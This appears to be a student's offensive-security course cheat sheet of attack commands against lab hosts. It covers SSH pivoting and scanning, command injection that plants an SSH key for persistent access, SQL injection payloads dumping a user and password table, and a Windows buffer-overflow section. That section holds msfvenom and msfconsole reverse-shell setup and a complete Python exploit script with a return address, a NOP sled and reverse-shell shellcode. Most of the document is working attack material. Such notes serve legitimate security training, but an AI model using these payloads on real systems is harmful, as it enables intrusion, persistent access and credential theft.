Control Sockets (different method of port forwarding)
Creates a file that represents the connection to a box. Created on linux opstation that has all of the tools.

lin_ops#  ssh -MS /tmp/jump student@10.50.35.64                                                   #Create initial control socket with jumpbox
lin_ops#  ssh -S /tmp/jump jump                                                                   #Connect to control socket to the jumpbox
lin_ops#  ssh -S /tmp/jump jump -O forward -D9050                                                 #Create dynamic port forward to jumpbox  
lin_ops#  proxychains nmap -Pn -T4 -vvvv 192.168.28.100                                           #Scan Tgt on network found
lin_ops#  ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 2222:192.168.28.100:2222  #Create static port forwards to 80 and 2222 on 192.168.28.100
lin_ops#  ssh -S /tmp/jump jump -O cancel -D9050                                                  #Will cancel portforward
lin_ops#  nc 127.0.0.1 1111                                                                       #Will test connection to port 80 on 192.168.28.100
lin_ops#  nc 127.0.0.1 2222                                                                       #Will test connection to port 222 on 192.168.28.100
lin_ops# ssh -MS /tmp/web <creds>@127.0.0.1 -p 2222                                               #Will create control socket to web server
lin_ops# firefox                                                                                  #Use firefox to go to 127.0.0.1:1111 to go to webserver


NMAP SCRIPTS
  /usr/share/nmap/scripts
smb-os-discovery
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
COMMAND INJECTION
Begin all new commands with a ;
UPLOAD SSH KEY TO WEB SERVER:
  ; whoami                                                #FIND OUT WHO YOU ARE
  ; cat /etc/passwd                                       #FIND HOME DIRECTORY
  ssh-keygen                                              #CREATE SSH KEY
  cat /home/student/.ssh/id_rsa.pub                       #LOOK AT SSH KEY
  ; mkdir /var/www/.ssh                                   #MAKE .ssh directory
  ; echo "COPIED KEY" >> /var/www/.ssh/authorized_keys    #ECHO YOUR KEY INTO THE .ssh DIRECTORY

      ###Directory Traversal VIA###

URL
FILE SEARCHING
CALL A FUNCTION USING THE DEV TOOLS CONSOLE ()



      ###EASY-5STEP SQL INJECTION###

  1. Identify Vulnerable Fields
  2. Identify # of Columns w/ Golden Statement
  3. Edit Golden Statement
  4. Craft Query
  5. Get Money/Points

FOR GET REQUEST via URL SEND TRUE OF FALSE STATEMENT THEN VIEW POST REQUEST IN WEB DEV TOOLS, PUT A QUESTION MARK IN URL AND COPY AND PASTE RAW DATA SENT IN POST 
tom' OR 1='1
username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271 -> URL....php?username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271


          ###POST METHOD###

  Ford' OR 1='1                       #DID NOT WORK
  Dodge' OR 1='1                      #DID NOT WORK
  Honda' OR 1='1                      #DID NOT WORK
  Audi' OR 1='1                       #THIS ONE WORKED
  Audi' UNION SELECT 1,2,3,4; #
  Audi' UNION SELECT 1,2,3,4,5; #
  Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
  Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires; #
  Audi' UNION SELECT id,2,name,pass,5 FROM session.user; #
  Audi 'UNION SELECT @@version,2,3,4,5; #            #SQL VERSION


         ###GET METHOD USING URL###

  http://10.50.35.49/uniondemo.php?Selection=1 OR 1=1                #SELECTION 1 DID NOT WORK
  http://10.50.35.49/uniondemo.php?Selection=2 OR 1=1                #SELECTION 2 DID WORK
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT 1,2,3
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT% 1,2,@@version      #GETS SQL VERSION
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
          ###REVERSE ENGINEERING###
main: 
  mov rax, 16                      //move into rax the value of 16                                      
  push rax                         //push value of rax (16) onto the stack. stack grows by 8 bytes
  jmp mem2                         //jump to memory location of mem2

mem1:
  mov rax, 0                       //move into rax the value of 0
  ret                              //return value of rax (first return register)(0)

mem2:
  pop r8                           //pop value from top of the stack (16) into r8, r8 is 16. stack shrinks by 8 bytes
  cmp rax, r8                      //compare to the value of rax (16) to the value of r8 (16). r8 is subtracted from rax.
  je mem1                          //zero flag is set from previous operation; values are equal. jmp to mem location of mem1
----------------------------------------------------------------------------------------------------------------------------
main:
  mov rcx, 25                      //move into rcx, the value of 25
  mov rbx, 62                      //move into rbx, the value of 62
  jump mem1                        //jump to memory location of mem1

mem1:
  sub rbx, 40                      //subtract from rbx(62) the value of 40. rbx is now 22
  mov rsi, rbx                     //move into rsi the value of rbx(22)
  cmp rcx, rsi                     //compare to rcx(25) the value of rsi(22). rsi is subtracted from rcx. flag is set.
  jle mem2                         //flag is set. jump to memory location of mem2

mem2:
  mov rax, 0                       //move into rax the value of 0
  ret                              //return the value of rax (first return register)(0)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

          ###EXPLOIT DEVELOPEMENT###
(WINDOWS)  

RUN .EXE AND SEE THAT IT OPENS PORT, USE LIN_OPS TO CONNECT TO PORT AND INTERACT WITH EXE
USE GHIDRA TO PERFROM ANALYSIS OF .EXE, FIND VULNERABLE FUNCTION

!mona modules
!mona jump -r esp -m "essfunc.dll"
Window -> Log Data Drop Down
msfvenom -p windows/shell/reverse_tcp lhost=10.50.20.72 lport=21001 -b "\x00" -f python
msfconsole
set payload windows/meterpreter/reverse_tcp
show options
set lhost 0.0.0.0
set lport 21001
run

#!/usr/bin/env python
import socket
#0x625012A0 -> 0x62 50 12 a0 -> "\xa0\x12\x50\x62"
#0x625012AD -> 0x62 50 12 ad -> "\xad\x12\x50\x62"
#0x625012BA -> 0x62 50 12 ba -> "\xba\x12\x50\x62"
#0x625012C7 -> 0x62 50 12 c7 -> "\xc7\x12\x50\x62"

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 15
buf += b"\xb8\xbb\x1c\x7d\xfd\xdb\xd1\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x59\x83\xea\xfc\x31\x42\x10\x03\x42"
buf += b"\x10\x59\xe9\x81\x15\x12\x12\x7a\xe6\x4c\x22\xa8"
buf += b"\x82\x07\x16\x7c\xc0\x45\x9b\xf7\x84\x7d\x2a\xe2"
buf += b"\x26\xca\x66\xcb\xb3\x46\x5f\x22\x3b\x97\x5f\xe8"
buf += b"\xff\xb6\x23\xf3\xd3\x18\x1d\x3c\x26\x59\x5a\x8a"
buf += b"\x4c\xb6\x36\x5a\x24\x1a\xa7\xef\x78\xa6\xc6\x3f"
buf += b"\xf7\x96\xb0\x3a\xc8\x62\x0d\x44\x19\x01\xd5\x66"
buf += b"\xc9\x14\x35\xed\xa1\x0e\x3c\x3b\x45\x12\x0f\x43"
buf += b"\xef\xe1\x5b\x30\xf1\x23\x92\x86\x5e\x0a\x1a\x0b"
buf += b"\x9e\x4b\x9d\xf4\xd5\xa7\xdd\x89\xed\x7c\x9f\x55"
buf += b"\x7b\x62\x07\x1d\xdb\x46\xb9\xf2\xba\x0d\xb5\xbf"
buf += b"\xc9\x49\xda\x3e\x1d\xe2\xe6\xcb\xa0\x24\x6f\x8f"
buf += b"\x86\xe0\x2b\x4b\xa6\xb1\x91\x3a\xd7\xa1\x7e\xe2"
buf += b"\x7d\xaa\x6d\xf5\x02\x53\x6e\xfa\x5e\xc3\xa2\x37"
buf += b"\x61\x13\xad\x40\x12\x21\x72\xfb\xbc\x09\xfb\x25"
buf += b"\x3a\x18\xeb\xd5\x94\xa2\x7c\x28\x15\xd2\x55\xef"
buf += b"\x41\x82\xcd\xc6\xe9\x49\x0e\xe6\x3f\xe7\x04\x70"
buf += b"\xca\xc5\x0c\xc8\xa2\x2b\x2d\x9a\x3b\xa2\xcb\x4a"
buf += b"\x6c\xe4\x43\x2b\xdc\x44\x34\xc3\x36\x4b\x6b\xf3"
buf += b"\x38\x86\x04\x9e\xd6\x7e\x7c\x37\x4e\xdb\xf6\xa6"
buf += b"\x8f\xf6\x72\xe8\x04\xf2\x83\xa7\xec\x77\x90\xd0"
buf += b"\x8a\x77\x68\x21\x3f\x77\x02\x25\xe9\x20\xba\x27"
buf += b"\xcc\x06\x65\xd7\x3b\x15\x62\x27\xba\x2f\x18\x1e"
buf += b"\x28\x0f\x76\x5f\xbc\x8f\x86\x09\xd6\x8f\xee\xed"
buf += b"\x82\xdc\x0b\xf2\x1e\x71\x80\x67\xa1\x23\x74\x2f"
buf += b"\xc9\xc9\xa3\x07\x56\x32\x86\x1b\x91\xcc\x54\x34"
buf += b"\x3a\xa4\xa6\x04\xba\x34\xcd\x84\xea\x5c\x1a\xaa"
buf += b"\x05\xac\xe3\x61\x4e\xa4\x6e\xe4\x3c\x55\x6e\x2d"
buf += b"\xe0\xcb\x6f\xc2\x39\xfc\x0a\xab\xbe\xfd\xea\xa5"
buf += b"\xda\xfe\xea\xc9\xdc\xc3\x3c\xf0\xaa\x02\xfd\x47"
buf += b"\xa4\x31\xa0\xee\x2f\x39\xf6\xf1\x65"


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.29.152", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------












